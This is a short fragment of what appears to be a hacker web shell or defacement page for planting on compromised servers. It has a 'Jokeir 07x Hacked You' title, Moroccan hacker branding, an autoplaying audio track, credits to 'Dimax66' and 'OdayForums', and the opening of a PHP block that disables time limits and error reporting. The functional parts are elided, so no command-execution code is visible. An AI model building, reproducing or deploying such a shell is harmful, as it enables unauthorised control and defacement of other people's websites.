...
<head>
	<title>Jokeir 07x Hacked You</title>
</head>
<style type="text/css">
body {
  overflow-x:hidden;
  font: 10px "Century Gothic", "Times Roman", sans-serif;
  background:url(https://g.top4top.io/p_3153yxp7b3.jpeg);
background-image: url(https://g.top4top.io/p_3153yxp7b3.jpeg);
...
<center>
<font face="Bungee" size="12">Jokeir 07x HK Morocco</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<title="Dimax66" alt="OdayForums" class="center" />
</marquee>
            <hr>
        </font>
        <audio src="https://k.top4top.io/m_3125n9ot51.mp3" loop="1" controls="1" autoplay="1"></audio><br>
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
	echo "<center><br>COPYRIGHT Dimax66</center>";
	exit();
}
